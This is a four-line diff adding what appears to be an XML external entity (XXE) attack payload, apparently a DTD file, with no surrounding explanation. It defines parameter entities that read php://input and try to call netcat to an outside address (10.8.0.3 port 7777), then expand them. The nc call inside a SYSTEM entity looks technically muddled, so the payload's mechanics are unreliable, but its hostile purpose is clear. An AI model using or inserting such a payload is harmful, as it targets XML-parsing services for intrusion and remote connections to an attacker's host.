@@ -1,0 +1,4 @@
+<!ENTITY % command SYSTEM "php://input">
+<!ENTITY % ping "<!ENTITY % execute SYSTEM 'nc 10.8.0.3 7777'>">
+%ping;
+%execute;
